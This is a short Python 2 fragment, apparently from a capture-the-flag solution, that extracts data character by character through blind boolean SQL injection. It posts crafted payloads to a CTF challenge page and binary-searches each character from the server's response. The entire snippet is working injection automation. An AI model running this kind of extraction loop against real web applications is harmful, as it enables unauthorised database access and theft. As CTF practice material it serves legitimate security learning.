def binary_search(poststr_b,length):
	session = requests.Session()
	result = ''
	for i in range(1,length+1):
		min = 32
		max = 126
		while abs(max-min) > 1:
			mid = (min + max)/2
			payload = poststr_b.format(i,mid)
			#print payload
			paramsPost = {"submit":"\x63d0\x4ea4\x67e5\x8be2","id":payload}
			response = session.post("http://ctf5.shiyanbar.com/web/earnest/index.php", data=paramsPost, headers=headers)
			if truestring in response.content:

				min = mid
			else:
				max = mid

		#print "i:{0}----max:{1}----min:{2}----mid:{3}".format(i,max,min,mid)
		result += chr(max)
		print result
